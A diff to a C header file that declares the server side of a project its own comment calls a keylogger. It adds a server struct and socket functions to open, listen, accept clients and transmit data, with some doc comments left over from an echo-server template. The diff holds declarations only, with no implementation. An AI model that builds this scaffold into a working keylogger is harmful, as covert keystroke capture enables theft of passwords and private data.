@@ -1,3 +1,9 @@
+/**
+ * Handles all client-server connections
+ *
+ * Creates a keylogger server
+ */
+
 #pragma once
 #include <fcntl.h>
 #include <netinet/in.h>
@@ -9,6 +15,16 @@
 #include <unistd.h>
 
 #include "keylogger.h"
+
+// Group the data needed for a server to run.
+typedef struct {
+  /// The socket descriptor to listen for connections.
+  int listener;
+  /// The address and port for the listener socket.
+  struct sockaddr_in addr;
+  /// The maximum number of clients that can be waiting to connect at once.
+  int max_backlog;
+} keylog_server;
 
 /**
  * Represents all the data that is sent over the network
@@ -26,7 +42,7 @@ typedef struct {
  *
  * @return A socket descriptor corresponding to the new socket.
  */
-void open_server(void);
+int open_server(void);
 /**
  * Attempt to close an open socket.
  *
@@ -52,6 +68,34 @@ void close_server(int socket_descriptor);
 struct sockaddr_in socket_address(in_addr_t addr, in_port_t port);
 
 /**
+ * Create a new echo server in dynamic memory.
+ *
+ * Given a socket address and a maximum backlog size, create a new echo server
+ * on the heap. Since the new server (or rather, the data it stores) is
+ * dynamically allocated, the caller is responsible for cleaning the server up
+ * afterwards (or terminating the program and letting that take care of things).
+ *
+ * @param addr The IPv4 address and port that the server will listen on.
+ * @param max_backlog The max number of clients that can wait to connect to the
+ * server.
+ * @return A pointer to the new echo server.
+ */
+keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog);
+
+/**
+ * Free an echo server in dynamic memory.
+ *
+ * Given a pointer to an echo server on the heap, free the dynamically allocated
+ * memory associated with that server. Attempting to free an uninitialized
+ * server, server dynamic memory that has already been freed, or a pointer to
+ * memory representing anything other than an echo_server instance will result
+ * in undefined behavior.
+ *
+ * @param server A pointer to the server to delete.
+ */
+void free_keylog_server(keylog_server* server);
+
+/**
  * Documentation here
  */
 void transmit_data(void);
@@ -60,3 +104,13 @@ void transmit_data(void);
  * Documentation here
  */
 void clear_data_queue(void);
+
+/**
+ * listen for a new client
+ */
+void listen_for_client(keylog_server* keylogger);
+
+/**
+ * accept a new client
+ */
+int accept_client(keylog_server* keylogger);
